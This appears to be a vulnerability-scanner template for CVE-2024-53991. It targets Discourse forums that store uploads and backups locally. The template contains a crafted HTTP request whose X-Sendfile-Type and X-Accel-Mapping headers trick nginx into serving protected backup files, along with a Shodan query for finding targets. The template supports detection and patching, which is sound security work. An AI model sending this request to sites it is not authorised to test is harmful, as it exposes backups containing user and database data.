http:
- extractors:
  - group: 1
    internal: true
    name: styles
    part: body
    regex:
    - href="(/stylesheets/discourse-.*?)"
    type: regex
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 403
    - contains(content_type, "text/html")
    - contains(response, "discourse")
    type: dsl
  raw:
  - 'GET {{styles}}&cachebuster={{randstr}} HTTP/1.1

    Host: {{Hostname}}

    X-Sendfile-Type: X-Accel-Redirect

    X-Accel-Mapping: .*=/downloads/backups/default/

    '
id: CVE-2024-53991
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-53991
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-200
    epss-percentile: 0.97173
    epss-score: 0.3999
  description: 'Discourse is an open source platform for community discussion. This
    vulnerability only impacts Discourse instances configured to use `FileStore--LocalStore`
    which means uploads and backups are stored locally on disk. If an attacker knows
    the name of the Discourse backup file, the attacker can trick nginx into sending
    the Discourse backup file with a well crafted request.

    '
  impact: 'Attackers who know the backup file name can bypass nginx access controls
    to download complete Discourse backup files containing sensitive data, user information,
    and database contents.

    '
  metadata:
    shodan-query: http.component:"Discourse"
  name: Discourse Backup File Disclosure Via Default Nginx Configuration
  reference:
  - https://projectdiscovery.io/blog/discourse-backup-disclosure-rails-send_file-quirk/
  - https://github.com/discourse/discourse/security/advisories/GHSA-567m-82f6-56rv
  remediation: 'Update to the latest stable, beta or tests-passed version of Discourse.
    Alternatively, store backups on S3 or disable backups temporarily until the fix
    is applied.

    '
  severity: high
  tags: cve,cve2024,discourse,disclosure,vuln
